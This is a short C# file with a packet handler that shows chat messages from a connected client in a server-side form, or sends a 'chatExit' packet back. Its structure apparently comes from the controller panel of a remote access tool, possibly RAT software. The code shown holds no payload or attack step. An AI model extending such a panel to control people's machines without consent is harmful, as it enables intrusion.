using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleChat
    {
        public HandleChat(MsgPack unpack_msgpack, Clients client)
        {
            FormChat chat = (FormChat)Application.OpenForms["chat:" + client.ID];
            if (chat != null)
            {
                Console.Beep();
                chat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                chat.richTextBox1.SelectionStart = chat.richTextBox1.TextLength;
                chat.richTextBox1.ScrollToCaret();
            }
            else
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "chatExit";
                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
        }
    }
}
